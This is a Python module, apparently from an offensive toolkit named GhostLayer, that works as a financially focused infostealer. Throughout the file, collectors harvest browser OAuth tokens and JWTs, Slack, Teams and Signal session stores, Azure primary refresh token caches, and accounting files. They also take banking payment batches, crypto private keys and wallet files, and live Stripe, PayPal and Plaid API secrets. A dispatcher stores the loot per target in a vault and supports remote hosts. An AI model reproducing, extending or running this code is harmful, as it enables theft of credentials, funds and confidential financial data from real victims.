"""
ghost_layer_financial.py
========================
Phase 5 — Financial & High-Leverage Artifact Collectors for GhostLayer.

Adds collection logic for every category identified in the gap analysis:

  P5-A: Browser web storage (IndexedDB / LocalStorage leveldb) —
        OAuth2 refresh tokens, JWTs in SPAs (Stripe, Brex, Workday, NetSuite)
  P5-B: Electron app session storage —
        Slack, Teams, TradingView, Bloomberg, brokerage clients
  P5-C: Azure AD / Entra ID PRT & WAM cache —
        Primary Refresh Token grants SSO to all enterprise portals
  P5-D: Desktop ERP / accounting artifacts —
        QuickBooks (.qbw/.qbb/.qbm), SAP GUI (saplogon.ini,
        SAPUILandscape.xml), Sage/Peachtree (.ptb/.sdb)
  P5-E: Banking batch / payment files —
        NACHA (.ach), SWIFT MT940/MT101, SEPA ISO20022 (.xml with IBAN/BIC)
  P5-F: Web3 / DeFi developer secrets —
        .env API keys (INFURA, ALCHEMY, STRIPE sk_live_),
        Foundry/Hardhat keystores, Solana CLI id.json
  P5-G: Payment gateway API keys in source —
        Stripe live keys, PayPal, Square, Plaid, Twilio patterns
  P5-H: Desktop hardware wallet portfolios —
        Ledger Live app.json, Trezor Suite, Bitcoin-Core wallet.dat,
        Electrum wallet files
  P5-I: Invoicing / wire instruction / cap-table documents —
        PDF/DOCX/XLSX matching high-value financial document patterns

Each method is a standalone `_collect_<category>()` returning List[dict]
and is designed to be called by GhostLayer's `run_phase5_financial()` or
wired into an existing `collect_credentials()` override.
"""

from __future__ import annotations

import glob
import json
import logging
import os
import platform
import re
import shutil
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

from ghost_layer_parsers import (
    parse_nacha_ach,
    parse_sepa_iso20022,
    extract_strings_from_leveldb,
    parse_web3_env_file,
    parse_sap_gui_config,
    parse_ledger_live_descriptors,
)

logger = logging.getLogger("GhostLayer.Financial")

# ── cross-platform home
HOME = Path.home()
APPDATA_LOCAL = Path(os.environ.get("LOCALAPPDATA", HOME / "AppData" / "Local"))
APPDATA_ROAMING = Path(os.environ.get("APPDATA", HOME / "AppData" / "Roaming"))
IS_WINDOWS = platform.system() == "Windows"


# ═══════════════════════════════════════════════════════════════════════════════
# P5-A: BROWSER WEB STORAGE (IndexedDB / LocalStorage leveldb)
# ═══════════════════════════════════════════════════════════════════════════════

BROWSER_PROFILE_ROOTS: List[Path] = [
    APPDATA_LOCAL / "Google" / "Chrome" / "User Data",
    APPDATA_LOCAL / "Microsoft" / "Edge" / "User Data",
    APPDATA_LOCAL / "BraveSoftware" / "Brave-Browser" / "User Data",
    HOME / "Library" / "Application Support" / "Google" / "Chrome",
    HOME / ".config" / "google-chrome",
    HOME / ".config" / "chromium",
]

# SaaS/fintech origins whose IndexedDB/LocalStorage is high-value
FINTECH_ORIGIN_KEYWORDS = [
    "stripe", "brex", "ramp", "quickbooks", "intuit", "netsuite", "xero",
    "workday", "adp", "gusto", "rippling", "mercury", "wise", "revolut",
    "plaid", "square", "shopify", "salesforce", "hubspot", "zendesk",
]


def _collect_browser_web_storage(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
    """
    P5-A — Enumerate Chrome-family IndexedDB and LocalStorage LevelDB folders,
    and extract security tokens (JWTs, OAuth tokens) directly from readable LevelDB blocks.
    """
    findings: List[Dict[str, Any]] = []
    roots = custom_roots or BROWSER_PROFILE_ROOTS
    for root in roots:
        if not root.is_dir():
            continue
        # Walk profiles: Default, Profile 1, Profile 2, ...
        profiles = [root / "Default"] + list(root.glob("Profile *"))
        for profile in profiles:
            for storage_type in ("IndexedDB", "Local Storage"):
                storage_dir = profile / storage_type
                if not storage_dir.is_dir():
                    continue
                try:
                    for item in storage_dir.iterdir():
                        origin_hint = item.name.lower()
                        is_fintech = any(kw in origin_hint for kw in FINTECH_ORIGIN_KEYWORDS)
                        
                        # Deep inspect .ldb / .log files if present
                        extracted_tokens: Dict[str, List[str]] = {}
                        if item.is_dir():
                            for ldb_file in list(item.glob("*.ldb"))[:5] + list(item.glob("*.log"))[:2]:
                                tokens = extract_strings_from_leveldb(ldb_file)
                                for k, v in tokens.items():
                                    if v:
                                        extracted_tokens.setdefault(k, []).extend(v)

                        findings.append({
                            "source": f"Browser Web Storage ({storage_type})",
                            "path": str(item),
                            "browser": root.parts[-3] if len(root.parts) >= 3 else "unknown",
                            "profile": profile.name,
                            "origin_hint": item.name,
                            "fintech_flag": is_fintech,
                            "severity": "critical" if is_fintech else "high",
                            "artifact_type": "browser_web_storage",
                            "extracted_tokens": extracted_tokens,
                        })
                except Exception as exc:
                    logger.debug("[P5-A] Error scanning %s: %s", storage_dir, exc)
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-B: ELECTRON APP SESSION STORAGE
# ═══════════════════════════════════════════════════════════════════════════════

ELECTRON_APPS: Dict[str, Path] = {
    "Slack": APPDATA_ROAMING / "Slack",
    "Microsoft Teams": APPDATA_ROAMING / "Microsoft" / "Teams",
    "Discord": APPDATA_ROAMING / "discord",
    "WhatsApp": APPDATA_ROAMING / "WhatsApp",
    "TradingView": APPDATA_ROAMING / "TradingView",
    "Interactive Brokers": APPDATA_LOCAL / "IBKR",
    "Signal": APPDATA_ROAMING / "Signal",
    "Notion": APPDATA_ROAMING / "Notion",
    "Linear": APPDATA_ROAMING / "Linear",
}

_ELECTRON_SESSION_PATTERNS = [
    "**/Local Storage/leveldb/**/*.ldb",
    "**/Session Storage/**/*.ldb",
    "**/Partitions/**/Local Storage/leveldb/**/*.ldb",
    "**/IndexedDB/**/*.ldb",
    "**/Cookies",
    "**/Network/Cookies",
]


def _collect_electron_sessions(custom_apps: Optional[Dict[str, Path]] = None) -> List[Dict[str, Any]]:
    """P5-B — Enumerate Electron app session/token storage LevelDB databases and extract tokens."""
    findings: List[Dict[str, Any]] = []
    apps = custom_apps or ELECTRON_APPS
    for app_name, app_root in apps.items():
        if not app_root.is_dir():
            continue
        try:
            for pattern in _ELECTRON_SESSION_PATTERNS:
                matches = list(app_root.glob(pattern))
                if matches:
                    extracted_tokens: Dict[str, List[str]] = {}
                    for match_file in matches[:5]:
                        if match_file.is_file():
                            tokens = extract_strings_from_leveldb(match_file)
                            for k, v in tokens.items():
                                if v:
                                    extracted_tokens.setdefault(k, []).extend(v)

                    findings.append({
                        "source": f"Electron Session ({app_name})",
                        "app": app_name,
                        "paths": [str(p) for p in matches[:20]],
                        "count": len(matches),
                        "severity": "critical",
                        "artifact_type": "electron_session_token",
                        "extracted_tokens": extracted_tokens,
                    })
                    break  # one entry per app is enough for the index
        except Exception as exc:
            logger.debug("[P5-B] Electron %s: %s", app_name, exc)
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-C: AZURE AD / ENTRA ID PRIMARY REFRESH TOKEN (PRT) & WAM CACHE
# ═══════════════════════════════════════════════════════════════════════════════

_WAM_PATHS = [
    # Windows Cloud AP token plugin cache
    Path(os.environ.get("SYSTEMROOT", "C:\\Windows")) / "System32" / "config" / "systemprofile" / "AppData" / "Local" / "Microsoft" / "Windows" / "CloudAP",
    APPDATA_LOCAL / "Microsoft" / "Windows" / "CloudAP",
    # MSAL token cache (user-level)
    APPDATA_LOCAL / "Microsoft" / "TokenBroker" / "Cache",
    APPDATA_ROAMING / "Microsoft" / "Windows" / "AccountPictures",  # sometimes used as cache marker
    # ADAL / MSAL cache files
    HOME / ".IdentityService",
    APPDATA_LOCAL / "Microsoft" / "IdentityCache",
]

_MSAL_CACHE_PATTERNS = [
    "msal*.cache",
    "*.msalcache",
    "TokenCache*",
    "*.bin",   # DPAPI-encrypted token blobs
]

_ADFS_REG_PATH = r"SOFTWARE\Microsoft\IdentityStore\Cache"


def _collect_azure_prt() -> List[Dict[str, Any]]:
    """P5-C — Discover PRT/WAM/MSAL cache artifacts on Azure AD-joined machines."""
    findings: List[Dict[str, Any]] = []
    for base in _WAM_PATHS:
        if not base.is_dir():
            continue
        try:
            for pat in _MSAL_CACHE_PATTERNS:
                hits = list(base.glob(pat))
                if hits:
                    findings.append({
                        "source": "Azure AD WAM / PRT Cache",
                        "base_path": str(base),
                        "files": [str(h) for h in hits[:10]],
                        "severity": "critical",
                        "artifact_type": "azure_prt_cache",
                        "note": "Contains DPAPI-encrypted PRT — grants full SSO across M365 / enterprise ERPs",
                    })
        except Exception as exc:
            logger.debug("[P5-C] WAM scan %s: %s", base, exc)

    # Registry hint: check if machine is AAD-joined
    if IS_WINDOWS:
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\CDJ") as k:
                tenant, _ = winreg.QueryValueEx(k, "TenantId")
                findings.append({
                    "source": "Azure AD Tenant Enrollment",
                    "tenant_id": str(tenant),
                    "severity": "critical",
                    "artifact_type": "azure_prt_cache",
                    "note": "Device is AAD-joined — PRT extraction highly leveraged",
                })
        except Exception:
            pass
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-D: DESKTOP ERP / ACCOUNTING ARTIFACTS
# ═══════════════════════════════════════════════════════════════════════════════

_QUICKBOOKS_ROOTS = [
    Path("C:\\Users\\Public\\Documents\\Intuit\\QuickBooks"),
    Path("C:\\ProgramData\\Intuit\\QuickBooks"),
    HOME / "Documents" / "Intuit" / "QuickBooks",
]
_QB_EXTENSIONS = {".qbw", ".qbb", ".qbm", ".tlg"}

_SAP_PATHS = [
    APPDATA_ROAMING / "SAP" / "Common" / "saplogon.ini",
    APPDATA_ROAMING / "SAP" / "Common" / "SAPUILandscape.xml",
    Path("C:\\Program Files (x86)\\SAP\\FrontEnd\\SAPgui\\saplogon.ini"),
    Path("C:\\Program Files\\SAP\\FrontEnd\\SAPgui\\saplogon.ini"),
]

_SAGE_EXTENSIONS = {".ptb", ".sdb", ".saj"}


def _collect_erp_artifacts(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
    """P5-D — QuickBooks company files, SAP GUI connection profiles, Sage data files."""
    findings: List[Dict[str, Any]] = []

    qb_roots = custom_roots or _QUICKBOOKS_ROOTS
    # QuickBooks
    for root in qb_roots:
        if not root.is_dir():
            continue
        try:
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    if Path(fn).suffix.lower() in _QB_EXTENSIONS:
                        findings.append({
                            "source": "QuickBooks Company File",
                            "file": os.path.join(dirpath, fn),
                            "extension": Path(fn).suffix.lower(),
                            "severity": "critical",
                            "artifact_type": "erp_accounting_config",
                        })
        except Exception as exc:
            logger.debug("[P5-D] QB walk %s: %s", root, exc)

    # SAP GUI
    for sap_path in _SAP_PATHS:
        if sap_path.is_file():
            parsed_servers = []
            try:
                content = sap_path.read_text(encoding="utf-8", errors="ignore")
                parsed_servers = parse_sap_gui_config(content)
            except Exception:
                pass

            findings.append({
                "source": "SAP GUI Connection Profile",
                "file": str(sap_path),
                "severity": "critical",
                "artifact_type": "erp_accounting_config",
                "parsed_systems": parsed_servers,
            })

    # Sage / Peachtree — walk home/documents for known extensions
    try:
        docs = HOME / "Documents"
        if docs.is_dir():
            for dirpath, _, filenames in os.walk(docs):
                for fn in filenames:
                    if Path(fn).suffix.lower() in _SAGE_EXTENSIONS:
                        findings.append({
                            "source": "Sage / Peachtree Data File",
                            "file": os.path.join(dirpath, fn),
                            "severity": "critical",
                            "artifact_type": "erp_accounting_config",
                        })
                # Cap depth
                depth = dirpath.count(os.sep) - str(docs).count(os.sep)
                if depth >= 4:
                    break
    except Exception as exc:
        logger.debug("[P5-D] Sage scan: %s", exc)

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-E: BANKING BATCH / PAYMENT FILES (NACHA, SWIFT, SEPA)
# ═══════════════════════════════════════════════════════════════════════════════

_BANKING_EXTENSIONS = {".ach", ".nacha", ".mt940", ".mt101", ".pain", ".camt"}
_BANKING_XML_PATTERNS = re.compile(
    r'<(IBAN|BIC|SWIFT|IBAN|CtrlSum|TtlAmt|CdtTrfTxInf)', re.IGNORECASE
)
_BANKING_SEARCH_ROOTS = [
    HOME / "Downloads",
    HOME / "Desktop",
    HOME / "Documents",
    Path("C:\\Users\\Public\\Downloads"),
]


def _collect_banking_files(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
    """P5-E — Discover NACHA ACH, SWIFT MT940/MT101, SEPA ISO20022 payment files and parse content."""
    findings: List[Dict[str, Any]] = []
    seen: set = set()
    roots = custom_roots or _BANKING_SEARCH_ROOTS
    for root in roots:
        if not root.is_dir():
            continue
        try:
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    fp = Path(dirpath) / fn
                    ext = fp.suffix.lower()
                    fn_lower = fn.lower()
                    is_banking = (
                        ext in _BANKING_EXTENSIONS
                        or any(kw in fn_lower for kw in ("wire", "ach", "swift", "sepa", "nacha", "mt940", "payroll_export", "treasury"))
                    )
                    if not is_banking and ext == ".xml":
                        try:
                            snippet = fp.read_text(encoding="utf-8", errors="ignore")[:2048]
                            is_banking = bool(_BANKING_XML_PATTERNS.search(snippet))
                        except Exception:
                            pass
                    if is_banking and str(fp) not in seen:
                        seen.add(str(fp))

                        # Parse content based on type
                        parsed_data: Dict[str, Any] = {}
                        try:
                            file_text = fp.read_text(encoding="utf-8", errors="ignore")
                            if ext in (".ach", ".nacha") or "ach" in fn_lower:
                                parsed_data = parse_nacha_ach(file_text)
                            elif ext in (".xml", ".pain") or "<Document" in file_text:
                                parsed_data = parse_sepa_iso20022(file_text)
                        except Exception as parse_exc:
                            logger.debug("Failed parsing banking file %s: %s", fp, parse_exc)

                        findings.append({
                            "source": "Banking Batch / Payment File",
                            "file": str(fp),
                            "extension": ext,
                            "severity": "critical",
                            "artifact_type": "banking_batch_file",
                            "parsed_batch": parsed_data,
                        })
                # Depth cap
                if dirpath.count(os.sep) - str(root).count(os.sep) >= 5:
                    break
        except Exception as exc:
            logger.debug("[P5-E] Banking scan %s: %s", root, exc)
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-F: WEB3 / DEFI DEVELOPER SECRETS
# ═══════════════════════════════════════════════════════════════════════════════

_WEB3_ENV_PATTERNS = re.compile(
    r'(?:INFURA_(?:API_KEY|PROJECT_ID)|ALCHEMY_(?:API_KEY|KEY)|'
    r'ETHERSCAN_API_KEY|DEPLOYER_PRIVATE_KEY|PRIVATE_KEY|'
    r'ALCHEMY_MAINNET_URL|WEB3_PROVIDER|ANKR_API_KEY)',
    re.IGNORECASE,
)
_SOLANA_KEYPAIR = HOME / ".config" / "solana" / "id.json"
_FOUNDRY_KEYSTORES = HOME / ".foundry" / "keystores"
_HARDHAT_ACCOUNTS_PATTERN = re.compile(r'private(?:Key|Keys)?\s*[:=]\s*["\']?(0x[a-fA-F0-9]{64})', re.IGNORECASE)

_ENV_FILE_SEARCH_ROOTS = [HOME / "repos", HOME / "projects", HOME / "code", HOME / "dev", HOME / "Documents"]


def _collect_web3_developer_secrets(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
    """P5-F — .env API keys, Foundry/Hardhat keystores, Solana CLI keypairs."""
    findings: List[Dict[str, Any]] = []

    # Solana CLI id.json
    if _SOLANA_KEYPAIR.is_file():
        findings.append({
            "source": "Solana CLI Keypair",
            "file": str(_SOLANA_KEYPAIR),
            "severity": "critical",
            "artifact_type": "web3_developer_secret",
            "note": "Unencrypted 64-byte Solana keypair — full wallet control",
        })

    # Foundry keystores
    if _FOUNDRY_KEYSTORES.is_dir():
        for ks in _FOUNDRY_KEYSTORES.iterdir():
            findings.append({
                "source": "Foundry Keystore",
                "file": str(ks),
                "severity": "critical",
                "artifact_type": "web3_developer_secret",
            })

    # .env files in dev repos
    roots = custom_roots or _ENV_FILE_SEARCH_ROOTS
    for repo_root in roots:
        if not repo_root.is_dir():
            continue
        try:
            for dirpath, dirs, filenames in os.walk(repo_root):
                # Skip node_modules, .git, venv
                dirs[:] = [d for d in dirs if d not in ("node_modules", ".git", "venv", ".venv", "__pycache__")]
                for fn in filenames:
                    if fn in (".env", ".env.local", ".env.production", ".env.development"):
                        fp = Path(dirpath) / fn
                        try:
                            content = fp.read_text(encoding="utf-8", errors="ignore")
                            if _WEB3_ENV_PATTERNS.search(content):
                                parsed_keys = parse_web3_env_file(content)
                                findings.append({
                                    "source": "Web3 .env Developer Secret",
                                    "file": str(fp),
                                    "severity": "critical",
                                    "artifact_type": "web3_developer_secret",
                                    "matched_patterns": _WEB3_ENV_PATTERNS.findall(content),
                                    "extracted_keys": parsed_keys,
                                })
                        except Exception:
                            pass
                    elif fn in ("hardhat.config.js", "hardhat.config.ts", "foundry.toml"):
                        fp = Path(dirpath) / fn
                        try:
                            content = fp.read_text(encoding="utf-8", errors="ignore")
                            if _HARDHAT_ACCOUNTS_PATTERN.search(content):
                                findings.append({
                                    "source": "Hardhat/Foundry Config with Private Key",
                                    "file": str(fp),
                                    "severity": "critical",
                                    "artifact_type": "web3_developer_secret",
                                })
                        except Exception:
                            pass
                depth = dirpath.count(os.sep) - str(repo_root).count(os.sep)
                if depth >= 6:
                    dirs.clear()
        except Exception as exc:
            logger.debug("[P5-F] Web3 dev secrets %s: %s", repo_root, exc)

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-G: PAYMENT GATEWAY API KEYS IN SOURCE / CONFIGS
# ═══════════════════════════════════════════════════════════════════════════════

_PAYMENT_KEY_PATTERNS: Dict[str, re.Pattern] = {
    "stripe_secret": re.compile(r'sk_live_[a-zA-Z0-9]{24,}'),
    "stripe_restricted": re.compile(r'rk_live_[a-zA-Z0-9]{24,}'),
    "stripe_webhook": re.compile(r'whsec_[a-zA-Z0-9]{24,}'),
    "paypal_secret": re.compile(r'(?:PAYPAL|paypal)[_\-](?:CLIENT_SECRET|SECRET)\s*[:=]\s*["\']?([A-Za-z0-9\-_]{20,})'),
    "square_token": re.compile(r'(?:sq0atp|EAAA)[A-Za-z0-9\-_]{20,}'),
    "plaid_secret": re.compile(r'(?:PLAID_SECRET|plaid_secret)\s*[:=]\s*["\']?([a-z0-9]{30,})'),
    "twilio_auth": re.compile(r'(?:TWILIO_AUTH_TOKEN|twilio_auth_token)\s*[:=]\s*["\']?([a-f0-9]{32})'),
    "braintree_key": re.compile(r'(?:BRAINTREE_PRIVATE_KEY|braintree_private_key)\s*[:=]\s*["\']?([a-z0-9]{32})'),
}

_SOURCE_EXTENSIONS = {".py", ".js", ".ts", ".env", ".json", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf"}
_SOURCE_SEARCH_ROOTS = [HOME / "repos", HOME / "projects", HOME / "code", HOME / "dev", HOME / "Documents"]


def _collect_payment_gateway_keys(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
    """P5-G — Scan source / config files for live payment gateway API keys."""
    findings: List[Dict[str, Any]] = []
    roots = custom_roots or _SOURCE_SEARCH_ROOTS
    for repo_root in roots:
        if not repo_root.is_dir():
            continue
        try:
            for dirpath, dirs, filenames in os.walk(repo_root):
                dirs[:] = [d for d in dirs if d not in ("node_modules", ".git", "venv", ".venv", "__pycache__", "dist", "build")]
                for fn in filenames:
                    if Path(fn).suffix.lower() not in _SOURCE_EXTENSIONS:
                        continue
                    fp = Path(dirpath) / fn
                    try:
                        content = fp.read_text(encoding="utf-8", errors="ignore")
                        for key_type, pat in _PAYMENT_KEY_PATTERNS.items():
                            match = pat.search(content)
                            if match:
                                extracted_val = match.group(0) if match.groups() == () else match.group(1)
                                findings.append({
                                    "source": f"Payment Gateway Key ({key_type})",
                                    "file": str(fp),
                                    "key_type": key_type,
                                    "severity": "critical",
                                    "artifact_type": "payment_gateway_key",
                                    "extracted_key": extracted_val,
                                })
                                break  # one hit per file is enough
                    except Exception:
                        pass
                depth = dirpath.count(os.sep) - str(repo_root).count(os.sep)
                if depth >= 6:
                    dirs.clear()
        except Exception as exc:
            logger.debug("[P5-G] Payment key scan %s: %s", repo_root, exc)
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-H: DESKTOP HARDWARE WALLET & PORTFOLIO MANAGERS
# ═══════════════════════════════════════════════════════════════════════════════

_HW_WALLET_PATHS: Dict[str, List[Path]] = {
    "ledger_live": [
        APPDATA_ROAMING / "Ledger Live" / "app.json",
        APPDATA_ROAMING / "Ledger Live" / "accounts.json",
        HOME / "Library" / "Application Support" / "Ledger Live" / "app.json",
    ],
    "trezor_suite": [
        APPDATA_ROAMING / "@trezor" / "suite-desktop",
        HOME / "Library" / "Application Support" / "@trezor" / "suite-desktop",
    ],
    "bitcoin_core": [
        APPDATA_ROAMING / "Bitcoin" / "wallet.dat",
        HOME / ".bitcoin" / "wallet.dat",
        HOME / "Library" / "Application Support" / "Bitcoin" / "wallet.dat",
    ],
    "electrum": [
        APPDATA_ROAMING / "Electrum" / "wallets",
        HOME / ".electrum" / "wallets",
        HOME / "Library" / "Application Support" / "Electrum" / "wallets",
    ],
    "exodus_wallet": [
        APPDATA_ROAMING / "Exodus",
        HOME / "Library" / "Application Support" / "Exodus",
    ],
    "atomic_wallet": [
        APPDATA_ROAMING / "atomic",
        HOME / "Library" / "Application Support" / "atomic",
    ],
}


def _collect_hw_wallet_artifacts(custom_wallet_paths: Optional[Dict[str, List[Path]]] = None) -> List[Dict[str, Any]]:
    """P5-H — Enumerate Ledger Live, Trezor, Bitcoin-Core, Electrum, Exodus desktop portfolios and parse descriptors."""
    findings: List[Dict[str, Any]] = []
    wallet_paths = custom_wallet_paths or _HW_WALLET_PATHS
    for wallet_name, paths in wallet_paths.items():
        for path in paths:
            if path.is_file():
                parsed_accounts: List[Dict[str, Any]] = []
                if wallet_name == "ledger_live":
                    try:
                        content = path.read_text(encoding="utf-8", errors="ignore")
                        parsed_accounts = parse_ledger_live_descriptors(content)
                    except Exception:
                        pass

                findings.append({
                    "source": f"Desktop Wallet ({wallet_name})",
                    "file": str(path),
                    "severity": "critical",
                    "artifact_type": "wallet_seed",
                    "note": f"{wallet_name} — may expose xpubs, account labels, full portfolio balance",
                    "parsed_accounts": parsed_accounts,
                })
            elif path.is_dir():
                try:
                    wallet_files = [
                        str(p) for p in path.glob("**/*")
                        if p.is_file() and p.suffix.lower() in (".json", ".dat", ".db", ".sqlite", ".ldb", "")
                    ][:20]
                    if wallet_files:
                        findings.append({
                            "source": f"Desktop Wallet Dir ({wallet_name})",
                            "directory": str(path),
                            "files": wallet_files,
                            "severity": "critical",
                            "artifact_type": "wallet_seed",
                        })
                except Exception as exc:
                    logger.debug("[P5-H] Wallet dir %s: %s", path, exc)
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# P5-I: INVOICING / WIRE INSTRUCTIONS / CAP TABLE DOCUMENTS
# ═══════════════════════════════════════════════════════════════════════════════

_FINANCIAL_DOC_PATTERNS = re.compile(
    r'(?:wire.?instruction|invoice|banking.?detail|voided.?check|direct.?deposit|'
    r'cap.?table|equity.?grant|payroll|salary|compensation|board.?minute|'
    r'ach.?form|wire.?transfer|routing.?number|iban|swift.?code|account.?number)',
    re.IGNORECASE,
)
_DOC_EXTENSIONS = {".pdf", ".docx", ".doc", ".xlsx", ".xls", ".csv"}
_DOC_SEARCH_ROOTS = [
    HOME / "Downloads", HOME / "Desktop", HOME / "Documents",
    HOME / "OneDrive", HOME / "Dropbox", HOME / "Google Drive",
    Path("C:\\Users\\Public\\Documents"),
]


def _collect_financial_documents() -> List[Dict[str, Any]]:
    """P5-I — Enumerate wire instructions, invoices, cap tables, payroll exports."""
    findings: List[Dict[str, Any]] = []
    seen: set = set()
    for root in _DOC_SEARCH_ROOTS:
        if not root.is_dir():
            continue
        try:
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    if Path(fn).suffix.lower() not in _DOC_EXTENSIONS:
                        continue
                    if _FINANCIAL_DOC_PATTERNS.search(fn):
                        fp = str(Path(dirpath) / fn)
                        if fp not in seen:
                            seen.add(fp)
                            findings.append({
                                "source": "Financial Document",
                                "file": fp,
                                "filename": fn,
                                "severity": "high",
                                "artifact_type": "financial_document",
                            })
                depth = dirpath.count(os.sep) - str(root).count(os.sep)
                if depth >= 5:
                    break
        except Exception as exc:
            logger.debug("[P5-I] Document scan %s: %s", root, exc)
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# DISPATCHER: run_phase5_financial()
# ═══════════════════════════════════════════════════════════════════════════════

def run_phase5_financial(vault=None, agent_id: str = "ghost_financial", remote_ctx: Any = None) -> Dict[str, Any]:
    """
    Orchestrate all Phase 5 financial collectors. Supports optional remote_ctx
    (instance of RemoteTargetContext) to collect from remote target shares.
    Optionally stores each batch into BlackVault with appropriate target metadata
    for TargetIdentity automatic ingestion.
    """
    if remote_ctx is not None:
        hostname = remote_ctx.host
        target_id = remote_ctx.target_id or f"remote:{hostname}"
        roots = remote_ctx.get_search_roots()
        browser_roots = roots.get("browser_roots")
        wam_roots = roots.get("wam_roots")
        erp_roots = roots.get("erp_roots")
        banking_roots = roots.get("banking_roots")
        source_roots = roots.get("source_roots")
        privilege_level = getattr(remote_ctx, "privilege_level", "admin")
        domain_role = getattr(remote_ctx, "domain_role", "workstation")
    else:
        hostname = __import__("socket").gethostname()
        target_id = f"local:{hostname}"
        browser_roots = None
        wam_roots = None
        erp_roots = None
        banking_roots = None
        source_roots = None
        privilege_level = "user"
        domain_role = "workstation"

    phase5: Dict[str, Any] = {
        "timestamp": time.time(),
        "hostname": hostname,
        "target_id": target_id,
        "phase": "5_financial",
        "browser_web_storage": [],
        "electron_sessions": [],
        "azure_prt": [],
        "erp_artifacts": [],
        "banking_files": [],
        "web3_secrets": [],
        "payment_gateway_keys": [],
        "hw_wallets": [],
        "financial_documents": [],
        "errors": [],
    }

    collectors = [
        ("browser_web_storage", lambda: _collect_browser_web_storage(browser_roots), "browser_web_storage"),
        ("electron_sessions",   _collect_electron_sessions,   "electron_session_token"),
        ("azure_prt",          _collect_azure_prt,           "azure_prt_cache"),
        ("erp_artifacts",      lambda: _collect_erp_artifacts(erp_roots),       "erp_accounting_config"),
        ("banking_files",      lambda: _collect_banking_files(banking_roots),   "banking_batch_file"),
        ("web3_secrets",       lambda: _collect_web3_developer_secrets(source_roots), "web3_developer_secret"),
        ("payment_gateway_keys", lambda: _collect_payment_gateway_keys(source_roots), "payment_gateway_key"),
        ("hw_wallets",         _collect_hw_wallet_artifacts, "wallet_seed"),
        ("financial_documents", _collect_financial_documents, "financial_document"),
    ]

    for key, fn, artifact_type in collectors:
        try:
            results = fn()
            phase5[key] = results
            if vault is not None and results:
                meta: Dict[str, Any] = {
                    "target_id": target_id,
                    "artifact_type": artifact_type,
                    "agent_id": agent_id,
                    "hostname": hostname,
                }
                try:
                    from recon.target_identity import TargetIdentityRegistry
                    for item in results:
                        item_name = f"{target_id}:{artifact_type}:{item.get('file', item.get('source', key))}"
                        TargetIdentityRegistry.instance().ingest_extract(
                            target_id=target_id,
                            artifact_name=item_name,
                            metadata={**meta, **{
                                "privilege_level": privilege_level,
                                "domain_role": domain_role,
                            }},
                            agent_id=agent_id,
                        )
                except Exception as tid_exc:
                    logger.debug("[P5] TargetIdentity ingest skipped: %s", tid_exc)

                vault.store(
                    f"ghost_p5_{key}_{int(time.time())}",
                    json.dumps(results, default=str).encode(),
                    metadata=meta,
                )
            logger.info("[GhostLayer.Financial] %s: %d findings", key, len(results))
        except Exception as exc:
            logger.warning("[GhostLayer.Financial] %s failed: %s", key, exc)
            phase5["errors"].append(f"{key}: {exc}")

    return phase5
